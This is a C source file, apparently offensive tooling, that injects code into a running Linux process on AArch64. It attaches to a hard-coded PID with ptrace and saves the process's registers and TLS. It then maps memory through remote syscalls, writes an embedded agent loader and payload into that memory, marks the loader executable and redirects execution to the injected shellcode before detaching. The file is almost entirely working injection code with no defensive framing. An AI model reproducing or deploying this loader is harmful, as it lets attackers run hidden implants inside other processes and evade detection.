#define _GNU_SOURCE
#include <asm/ptrace.h>
#include <elf.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#include "ptrace_aarch64_reg.h"
#include "agent.h"

#define PAGESIZE 4096
#define PAYLOAD_LEN 1647944
#define PID 178150
#define CHECK(x) if ((x) == -1) { perror(#x); exit(1); }
#define NT_ARM_TLS 0x401 // Ptrace flag for AArch64 TLS register

struct cleanup {
    uint64_t x[31];       // x0-x30 from saved user_pt_regs.regs[]
    uint64_t sp;
    uint64_t pc;
    uint64_t pstate;
    uint64_t tpidr_el0;
    uint8_t  sigmask[128];
    uint64_t a_addr;
    uint64_t a_size;
    uint64_t b_addr;
    uint64_t clean_addr;
    uint64_t stack_addr;
    uint64_t loader_sp;
};

int main() {
    pid_t pid = PID;
    int status;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        return EXIT_FAILURE;
    }

    if (wait_for_tracee(pid, &status) == -1) {
        return EXIT_FAILURE;
    }

    struct user_pt_regs regs, backup = {0};

    struct iovec iov = {
        .iov_base = &backup,
        .iov_len = sizeof(backup),
    };

    CHECK(ptrace(PTRACE_GETREGSET, pid, (void *)NT_PRSTATUS, &iov));
    regs = backup;

    // backup TLS registers
    uint64_t tls_backup = 0;
    struct iovec tls_iov;
    tls_iov.iov_base = &tls_backup;
    tls_iov.iov_len = sizeof(tls_backup);
    ptrace(PTRACE_GETREGSET, pid, NT_ARM_TLS, &tls_iov);


    unsigned long syscall_pc = backup.pc;
    struct cleanup clean = {0};

    uint64_t a_size = align_up(agent_len, PAGESIZE);
    uint64_t ctx_map_len = align_up(sizeof(clean), PAGESIZE);
    uint64_t payload_map_len = align_up(PAYLOAD_LEN, PAGESIZE);
    size_t stack_size = 3 * 1024 * 1024;
    clean.a_size = a_size + ctx_map_len + payload_map_len + stack_size;


    // map and write memory region A
    unsigned long syscall_result = 0;
    remote_syscall(pid, &regs, syscall_pc, __NR_mmap, 0, clean.a_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0, &syscall_result);
    clean.a_addr = (uint64_t)syscall_result;
    write_payload(pid, (long)clean.a_addr, agent, agent_len);

    // set up cleanup struct
    for (int i = 0; i < 31; i++) {
        clean.x[i] = backup.regs[i];
    }

    clean.sp = backup.sp;
    clean.pc = backup.pc;
    clean.pstate = backup.pstate;
    clean.tpidr_el0 = tls_backup;

    // Write cleanup struct to remote process
    uintptr_t ctx_remote = clean.a_addr + a_size; // Address of the cleanup struct
    clean.b_addr = ctx_remote + ctx_map_len; // Address of the payload
    clean.clean_addr = ctx_remote;
    clean.stack_addr = clean.b_addr + payload_map_len;

    write_payload(pid, ctx_remote, (unsigned char *)&clean, sizeof(clean));

    // only change permissions on memory region containing loader. Not the agent, stack, or struct
    remote_syscall(pid, &regs, syscall_pc, __NR_mprotect, (unsigned long)clean.a_addr, agent_len, PROT_READ | PROT_EXEC, 0, 0, 0, &syscall_result);

    regs = backup;
    regs.pc = (unsigned long)(clean.a_addr); // Set PC to the entry point of the injected shellcode
    regs.regs[0] = clean.clean_addr;

    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);

    // Tell process to continue at payload address and detatch
    CHECK(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov));
    memset(&clean, 0, sizeof(clean));
    __asm__ __volatile__("" ::: "memory");
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    exit(0);
    return 0;
}